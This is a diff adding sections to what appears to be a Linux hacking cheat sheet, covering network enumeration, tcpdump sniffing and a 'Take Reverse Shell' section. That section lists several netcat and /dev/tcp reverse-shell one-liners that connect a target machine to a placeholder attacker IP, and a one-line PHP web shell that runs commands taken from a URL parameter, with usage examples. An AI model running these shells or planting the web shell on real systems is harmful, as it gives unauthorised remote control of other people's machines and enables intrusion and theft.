@@ -115,7 +115,7 @@ replace your word with *:
 grep -i *
 ```
 # Network Environment & Communications
-### Network Configuraation(DHCP, DNS, Forwarding, etc.):
+### Network Configuration(DHCP, DNS, Forwarding, etc.):
 ```
 cat /etc/resolv.conf
 cat /etc/sysconfig/network
@@ -123,11 +123,49 @@ cat /etc/networks
 iptables -L
 hostname
 ```
+### about MAC/IP:
+```
+arp -a
+route
+```
+### A way for packet sniffing:
+```
+tcpdump
+```
+Hint: tcpdump tcp dst {ip} {port} and tcp dst {ip} {port}
+### Take Reverse Shell:
+you can use what you want.
+you need static ip for this simple ways but there is some other ways if you don't have static ip address, like ngrok:
 
-
-
-
-
+1. The first way:
+```
+nc -nlvp -p {port} # on the attacker system
+nc {Attacker IP} {port} -e /bin/bash # on the target system
+```
+2. The second way:
+```
+nc -nlvp -p {port} # on the attacker system
+mknod backpipe p && nc {Attacker IP} {port} 0<backpipe | /bin/bash 1>backpipe # on the target system
+```
+3. The third way:
+```
+nc -nlvp -p {port} # on the attacker system
+/bin/bash -i > /dev/tcp/{Attacker IP}/{port} 0<&1 2>&1
+```
+4. The fourth way:
+Here you need to make a file that has ".php" format for exmple in the taget system, here is the code:
+```
+<?=`$_GET[cmd]`?>
+```
+and you can use it like this:
+```
+ip/anything/file.php?cmd={here you have RCE}
+```
+so, after that you need to make python program(just example) for yourself in your computer(AttackerSystem) that make the request to the web server, parsing the response, and present it to you after that, how can you use it?
+```
+python rce.py 'ip/anything/file.php?cmd=hostname'
+```
+There are many ways to do this, but it depends on the conditions of the server you have.
 
 
 
